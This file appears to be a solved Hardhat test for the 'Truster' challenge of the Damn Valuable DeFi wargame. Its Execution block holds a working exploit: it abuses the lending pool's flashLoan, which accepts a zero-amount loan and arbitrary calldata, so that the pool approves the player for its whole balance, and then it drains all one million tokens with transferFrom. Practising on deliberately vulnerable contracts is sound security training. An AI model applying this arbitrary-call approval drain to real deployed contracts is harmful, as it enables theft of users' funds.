const { ethers } = require('hardhat');
const { expect } = require('chai');

describe('[Challenge] Truster', function () {
    let deployer, player;
    let token, pool;

    const TOKENS_IN_POOL = 1000000n * 10n ** 18n;

    before(async function () {
        /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
        [deployer, player] = await ethers.getSigners();

        token = await (await ethers.getContractFactory('DamnValuableToken', deployer)).deploy();
        pool = await (await ethers.getContractFactory('TrusterLenderPool', deployer)).deploy(token.address);
        expect(await pool.token()).to.eq(token.address);

        await token.transfer(pool.address, TOKENS_IN_POOL);
        expect(await token.balanceOf(pool.address)).to.equal(TOKENS_IN_POOL);

        expect(await token.balanceOf(player.address)).to.equal(0);
    });

    it('Execution', async function () {
        /** CODE YOUR SOLUTION HERE */

        // Create a calldata to call `token.approve()` from the `pool` contract.
        const ABI = ["function approve(address spender, uint256 amount)"]
        const iface = new ethers.utils.Interface(ABI)
        const calldata = iface.encodeFunctionData("approve", [player.address, TOKENS_IN_POOL])

        // Request 0 tokens, so nothing needs to be paid back
        await pool.connect(player).flashLoan(0, player.address, token.address, calldata)
        expect(await token.allowance(pool.address, player.address)).to.equal(TOKENS_IN_POOL)

        // Drain the pool after the approval
        await token.connect(player).transferFrom(pool.address, player.address, TOKENS_IN_POOL)
    });

    after(async function () {
        /** SUCCESS CONDITIONS - NO NEED TO CHANGE ANYTHING HERE */

        // Player has taken all tokens from the pool
        expect(
            await token.balanceOf(player.address)
        ).to.equal(TOKENS_IN_POOL);
        expect(
            await token.balanceOf(pool.address)
        ).to.equal(0);
    });
});

